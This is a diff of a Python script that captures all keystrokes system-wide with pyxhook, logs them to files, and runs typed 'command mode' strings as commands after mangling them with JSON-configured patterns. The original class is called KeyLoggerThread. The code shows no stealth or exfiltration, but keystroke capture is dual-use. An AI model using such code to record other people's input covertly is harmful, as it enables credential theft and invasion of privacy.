@@ -1,3 +1,4 @@
+
 #!/usr/bin/python
 
 import threading
@@ -7,10 +8,12 @@ import time
 import datetime
 import shutil
 import pyxhook
+import json
 import ConfigParser
 from command import CommandRunner
+from textmangler import TextMangler
 
-class KeyLoggerThread(threading.Thread):
+class LoggerThread(threading.Thread):
     
     def __init__(self):
         super(LoggerThread, self).__init__()
@@ -33,6 +36,8 @@ class KeyLoggerThread(threading.Thread):
         self.startDateTime = datetime.datetime.now().strftime(self.fileDateFormat)
         self.commandMode = False
         self.commandString = ""
+        data = self.config.get("Replacements", "patterns")
+        self.commandPatterns = self.replaceList = json.loads(data)
 
     def run(self):
         self.filename = self.createNewWorkingFile()
@@ -90,12 +95,15 @@ class KeyLoggerThread(threading.Thread):
             content_file.write(key + '\n')
             
     def writeKeyToCommand(self, Key):
-        self.commandString += Key
+        self.commandString += Key + '\n'
         
     def executeCommandString(self):
         runner = CommandRunner()
-        print("Running command: " + self.commandString)
-        runner.run(self.commandString)
+        mangler = TextMangler(self.commandPatterns)
+        print("Mangling command: " + self.commandString)
+        mangledCommand = mangler.mangle(self.commandString) 
+        print("Running command: " + mangledCommand)
+        runner.run(mangledCommand)
         print("Command run")
             
     def save(self):
